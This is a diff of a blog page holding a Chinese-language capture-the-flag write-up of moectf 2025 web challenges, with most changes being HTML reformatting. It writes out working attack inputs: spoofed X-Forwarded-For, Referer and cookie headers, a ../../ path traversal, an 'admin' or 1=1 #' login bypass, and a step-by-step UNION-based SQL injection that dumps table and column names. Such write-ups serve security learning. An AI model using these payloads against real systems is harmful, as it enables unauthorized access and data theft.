@@ -20,12 +20,12 @@
     var CONFIG = {"hostname":"example.com","root":"/","scheme":"Gemini","version":"7.8.0","exturl":false,"sidebar":{"position":"left","display":"post","padding":18,"offset":12,"onmobile":false},"copycode":{"enable":false,"show_result":false,"style":null},"back2top":{"enable":true,"sidebar":false,"scrollpercent":false},"bookmark":{"enable":false,"color":"#222","save":"auto"},"fancybox":false,"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"algolia":{"hits":{"per_page":10},"labels":{"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}},"localsearch":{"enable":false,"trigger":"auto","top_n_per_article":1,"unescape":false,"preload":false},"motion":{"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}}};
   </script>
 
-  <meta name="description" content="T1-万言启封咒考察一个f12“元素”标签的使用，更改输入框内文字为txt内容即可 T2-初识金曦玄轨考察bp等抓包，从模糊文字可知要访问&#x2F;golden_trail页面，在响应头中即可看到flag T3-问剑石！篡天改命！宗门弟子改命，查看源代码可知是用一个POST请求上传level，并用js上传manifest，各自改好POST上去即可 T4-金曦破禁与七绝傀儡阵 磐石傀儡：get">
+  <meta name="description" content="T1-万言启封咒 考察一个f12“元素”标签的使用，更改输入框内文字为txt内容即可 T2-初识金曦玄轨 考察bp等抓包，从模糊文字可知要访问&#x2F;golden_trail页面，在响应头中即可看到flag T3-问剑石！篡天改命！ 宗门弟子改命，查看源代码可知是用一个POST请求上传level，并用js上传manifest，各自改好POST上去即可 T4-金曦破禁与七绝傀儡阵   磐石傀儡：get方">
 <meta property="og:type" content="article">
 <meta property="og:title" content="moectf 2025-web write-up">
 <meta property="og:url" content="http://example.com/2026/09/05/web/index.html">
 <meta property="og:site_name" content="aClosure&#39;s奇妙的妙妙据点">
-<meta property="og:description" content="T1-万言启封咒考察一个f12“元素”标签的使用，更改输入框内文字为txt内容即可 T2-初识金曦玄轨考察bp等抓包，从模糊文字可知要访问&#x2F;golden_trail页面，在响应头中即可看到flag T3-问剑石！篡天改命！宗门弟子改命，查看源代码可知是用一个POST请求上传level，并用js上传manifest，各自改好POST上去即可 T4-金曦破禁与七绝傀儡阵 磐石傀儡：get">
+<meta property="og:description" content="T1-万言启封咒 考察一个f12“元素”标签的使用，更改输入框内文字为txt内容即可 T2-初识金曦玄轨 考察bp等抓包，从模糊文字可知要访问&#x2F;golden_trail页面，在响应头中即可看到flag T3-问剑石！篡天改命！ 宗门弟子改命，查看源代码可知是用一个POST请求上传level，并用js上传manifest，各自改好POST上去即可 T4-金曦破禁与七绝傀儡阵   磐石傀儡：get方">
 <meta property="og:locale" content="zh_CN">
 <meta property="article:published_time" content="2026-09-05T14:54:07.000Z">
 <meta property="article:modified_time" content="2026-09-05T14:59:45.010Z">
@@ -232,45 +232,62 @@
 
       
         <span id="more"></span>
-
-<h2 id="T1-万言启封咒"><a href="#T1-万言启封咒" class="headerlink" title="T1-万言启封咒"></a>T1-万言启封咒</h2><p>考察一个f12“元素”标签的使用，更改输入框内文字为txt内容即可</p>
-<h2 id="T2-初识金曦玄轨"><a href="#T2-初识金曦玄轨" class="headerlink" title="T2-初识金曦玄轨"></a>T2-初识金曦玄轨</h2><p>考察bp等抓包，从模糊文字可知要访问&#x2F;golden_trail页面，在响应头中即可看到flag</p>
-<h2 id="T3-问剑石！篡天改命！"><a href="#T3-问剑石！篡天改命！" class="headerlink" title="T3-问剑石！篡天改命！"></a>T3-问剑石！篡天改命！</h2><p>宗门弟子改命，查看源代码可知是用一个POST请求上传level，并用js上传manifest，各自改好POST上去即可</p>
-<h2 id="T4-金曦破禁与七绝傀儡阵"><a href="#T4-金曦破禁与七绝傀儡阵" class="headerlink" title="T4-金曦破禁与七绝傀儡阵"></a>T4-金曦破禁与七绝傀儡阵</h2><ol>
-<li><p>磐石傀儡：get方法传参即可，直接?key&#x3D;xdsec</p>
+<h2 id="T1-万言启封咒">T1-万言启封咒</h2>
+<p>考察一个f12“元素”标签的使用，更改输入框内文字为txt内容即可</p>
+<h2 id="T2-初识金曦玄轨">T2-初识金曦玄轨</h2>
+<p>考察bp等抓包，从模糊文字可知要访问/golden_trail页面，在响应头中即可看到flag</p>
+<h2 id="T3-问剑石！篡天改命！">T3-问剑石！篡天改命！</h2>
+<p>宗门弟子改命，查看源代码可知是用一个POST请求上传level，并用js上传manifest，各自改好POST上去即可</p>
+<h2 id="T4-金曦破禁与七绝傀儡阵">T4-金曦破禁与七绝傀儡阵</h2>
+<ol>
+<li>
+<p>磐石傀儡：get方法传参即可，直接?key=xdsec</p>
 </li>
-<li><p>织云傀儡:   post方法传参即可，注意不要直接复制（手打一下织云阁&#x3D;第一</p>
+<li>
+<p>织云傀儡:   post方法传参即可，注意不要直接复制（手打一下织云阁=第一</p>
 </li>
-<li><p>溯源傀儡：本地访问，更改XFF（X-Forwarded-For）为127.0.0.1即可</p>
+<li>
+<p>溯源傀儡：本地访问，更改XFF（X-Forwarded-For）为127.0.0.1即可</p>
 </li>
-<li><p>器灵傀儡：使用“moe browser”访问，更改useragent即可</p>
+<li>
+<p>器灵傀儡：使用“moe browser”访问，更改useragent即可</p>
 </li>
-<li><p>心印傀儡：“以xt的身份认证user”，注意<strong>认证</strong>这两个字的含金量，所以加上cookie:user&#x3D;xt</p>
+<li>
+<p>心印傀儡：“以xt的身份认证user”，注意<strong>认证</strong>这两个字的含金量，所以加上cookie:user=xt</p>
 </li>
-<li><p>前尘傀儡：”从<a target="_blank" rel="noopener" href="http://panshi/entry%E6%9D%A5%E2%80%9C%EF%BC%8C%E6%9B%B4%E6%94%B9Referer%E5%8D%B3%E5%8F%AF">http://panshi/entry来“，更改Referer即可</a></p>
+<li>
+<p>前尘傀儡：”从<a target="_blank" rel="noopener" href="http://panshi/entry%E6%9D%A5%E2%80%9C%EF%BC%8C%E6%9B%B4%E6%94%B9Referer%E5%8D%B3%E5%8F%AF">http://panshi/entry来“，更改Referer即可</a></p>
 </li>
-<li><p>逆转傀儡：PUT一个”新生！“上去即可（别忘了<strong>感叹号</strong>，并且更改Content-Type）<br><u>PUT &#x2F;rebirth HTTP&#x2F;1.1 Host: 逆转傀儡 Content-Type: text&#x2F;plain 新生！</u><br><u>关键：使用PUT方法；简单设置Content-Type；在Body中传递一个象征”新生”的信息</u></p>
+<li>
+<p>逆转傀儡：PUT一个”新生！“上去即可（别忘了<strong>感叹号</strong>，并且更改Content-Type）<br>
+<u>PUT /rebirth HTTP/1.1 Host: 逆转傀儡 Content-Type: text/plain 新生！</u><br>
+<u>关键：使用PUT方法；简单设置Content-Type；在Body中传递一个象征&quot;新生&quot;的信息</u></p>
 </li>
 </ol>
-<h2 id="T5-打上门来！"><a href="#T5-打上门来！" class="headerlink" title="T5-打上门来！"></a>T5-打上门来！</h2><p>别给首页那个破阵的文件骗了……那个是T4的，第一次做顺序放反了，被坑了好久（泣）</p>
-<p>..&#x2F;..&#x2F;穿越回主目录下即可发现flag</p>
-<h2 id="T6-藏经禁制？玄机初探！"><a href="#T6-藏经禁制？玄机初探！" class="headerlink" title="T6-藏经禁制？玄机初探！"></a>T6-藏经禁制？玄机初探！</h2><p>mysql绕过登录</p>
+<h2 id="T5-打上门来！">T5-打上门来！</h2>
+<p>别给首页那个破阵的文件骗了……那个是T4的，第一次做顺序放反了，被坑了好久（泣）</p>
+<p>…/…/穿越回主目录下即可发现flag</p>
+<h2 id="T6-藏经禁制？玄机初探！">T6-藏经禁制？玄机初探！</h2>
+<p>mysql绕过登录</p>
 <p>用户名字段大概是:</p>
-<p>SELECT * FROM users WHERE username&#x3D;’$username’ AND password&#x3D;’$password’;（变量记得加$，md打不出来）</p>
-<p>所以用户名输入admin’ or 1 &#x3D; 1 # 以注释掉密码，之后密码字段随便填就好</p>
-<h2 id="T7-灵蛛探穴与阴阳双生符"><a href="#T7-灵蛛探穴与阴阳双生符" class="headerlink" title="T7-灵蛛探穴与阴阳双生符"></a>T7-灵蛛探穴与阴阳双生符</h2><p>”告知搜索引擎<strong>爬虫</strong>哪些页面可以抓取“，想到robots.txt，访问，发现”Disallow: &#x2F;flag.php“</p>
-<p>访问后发现要求a!&#x3D;b,且md5值”相等“，想到md5碰撞，网上搜两个传参就好（传参直接跟?就好，不用&#x2F;）</p>
-<h2 id="T8-天衍真言，星图显圣"><a href="#T8-天衍真言，星图显圣" class="headerlink" title="T8-天衍真言，星图显圣"></a>T8-天衍真言，星图显圣</h2><p>根据提示，可知考察sql注入，首先尝试admin’ or 1 &#x3D; 1#，给出回显“Welcome admin”，并未登录</p>
-<p>输入预期错误admin’ and 1&#x3D;2#，显示登陆错误，实锤是sql注入</p>
+<p>SELECT * FROM users WHERE username=‘$username’ AND password=‘$password’;（变量记得加$，md打不出来）</p>
+<p>所以用户名输入admin’ or 1 = 1 # 以注释掉密码，之后密码字段随便填就好</p>
+<h2 id="T7-灵蛛探穴与阴阳双生符">T7-灵蛛探穴与阴阳双生符</h2>
+<p>”告知搜索引擎<strong>爬虫</strong>哪些页面可以抓取“，想到robots.txt，访问，发现”Disallow: /flag.php“</p>
+<p>访问后发现要求a!=b,且md5值”相等“，想到md5碰撞，网上搜两个传参就好（传参直接跟?就好，不用/）</p>
+<h2 id="T8-天衍真言，星图显圣">T8-天衍真言，星图显圣</h2>
+<p>根据提示，可知考察sql注入，首先尝试admin’ or 1 = 1#，给出回显“Welcome admin”，并未登录</p>
+<p>输入预期错误admin’ and 1=2#，显示登陆错误，实锤是sql注入</p>
 <p>admin’ order by 3#起报错，说明就user和pwd两列</p>
 <p>-1’ union select 1111,2222#，回显1111，说明pwd的字段是黑盒（注意，<strong>不要再用admin</strong>！！！admin存在就会一直报welcomeadmin，啥也拿不到）</p>
 <p>爆库名：-1’ union select database(),2222# ，发现在user库</p>
-<p>爆表名：-1’ union select table_name,2222 from information_schema.tables where table_schema &#x3D; database() #，回显welcome flag</p>
+<p>爆表名：-1’ union select table_name,2222 from information_schema.tables where table_schema = database() #，回显welcome flag</p>
 <p>注意：“爆表名”时，where跟的是table_<strong>schema</strong>，且值写database，不要具体写user（待补充</p>
-<p>爆列名：-1’ union select column_name,2222 from information_schema.columns where table_schema &#x3D; database() <u>and table_name &#x3D;</u> <strong>‘flag’</strong> #，得到回显welcome value</p>
+<p>爆列名：-1’ union select column_name,2222 from information_schema.columns where table_schema = database() <u>and table_name =</u> <strong>‘flag’</strong> #，得到回显welcome value</p>
 <p>注意：flag要加双引号（泣），上面的原因也是这个</p>
 <p>爆字段：-1’ union select value,2 from flag #，得到flag</p>
-<h2 id="T9-星墟禁制·天机问路"><a href="#T9-星墟禁制·天机问路" class="headerlink" title="T9-星墟禁制·天机问路"></a>T9-星墟禁制·天机问路</h2><p>看网上wp，说是个SSRF漏洞，明天继续更（）</p>
+<h2 id="T9-星墟禁制·天机问路">T9-星墟禁制·天机问路</h2>
+<p>看网上wp，说是个SSRF漏洞，明天继续更（）</p>
 
     </div>
 
